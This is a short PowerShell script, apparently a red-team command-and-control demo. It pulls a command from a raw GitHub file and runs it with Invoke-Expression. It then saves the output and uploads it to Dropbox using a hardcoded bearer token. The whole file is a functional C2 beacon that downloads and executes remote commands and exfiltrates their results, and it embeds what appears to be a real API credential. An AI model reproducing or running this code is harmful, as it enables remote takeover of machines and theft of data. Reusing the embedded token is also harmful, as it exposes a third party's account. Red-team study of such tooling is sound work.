
$BASEDIR = pwd
$C2GB_token = 'sl.BWzBFL9YhxyKsOIZ3r6l90rMsP6LZ1LpEdoSXztMmbHD2MaCBlVxNCfsbWQzjYU-d-Zseo-8pbGw2AV-HXkFaKKRW97xkSt0tng79cI9W_sothITEcZGwSI1rHUlW-3DBAZ-sPEcffEg'

$cmd = Invoke-webrequest -URI "https://raw.githubusercontent.com/roccosicilia/sToolz/master/RedTeam/C2demo/input.txt"
Write-Host "Test del comando" + $cmd

if ( "$cmd" -eq 'NOP')
{
    Write-Host $cmd
}
else
{
    $content = Invoke-Expression $cmd
    Write-Host $content
    $content | Out-File -FilePath "$BASEDIR\psoutput.txt"

    # set arg to send file
    $TargetFilePath = '/psoutput.txt'


    $args = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $auth = "Bearer " + $C2GB_token

    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $auth)
    $headers.Add("Dropbox-API-Arg", $args)
    $headers.Add("Content-Type", 'application/octet-stream')

    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile .\psoutput.txt -Headers $headers
}